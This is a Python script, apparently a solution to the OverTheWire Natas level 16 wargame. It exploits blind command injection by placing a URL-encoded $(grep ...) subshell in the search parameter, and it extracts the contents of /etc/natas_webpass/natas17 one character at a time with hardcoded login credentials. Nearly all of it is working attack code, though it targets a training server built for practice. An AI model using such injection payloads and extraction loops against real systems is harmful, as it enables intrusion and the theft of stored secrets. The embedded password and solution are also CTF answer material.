import requests
from requests.auth import HTTPBasicAuth

passchars = "a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z"
temp = passchars.split(",")
possible = []
for char in temp:
	possible.append(char)
	possible.append(char.upper())
for i in range(0,10):
	possible.append(str(i))

updatedpossible = []
passwd = ''

for element in possible:
	r = requests.post('http://natas16.natas.labs.overthewire.org/?needle=false%24%28grep+{}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(element), auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
	if(not "false" in r.text):
		updatedpossible.append(element)
print("Found Possible Characters: ", updatedpossible)

for i in range(0,32):
	for element in updatedpossible:
		r = requests.post('http://natas16.natas.labs.overthewire.org/?needle=false%24%28grep+%5E{}{}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(passwd,element), auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
		if(not "false" in r.text):
			passwd += element
			print("Found password character at position: ",i," ",element)
			break

print(passwd)
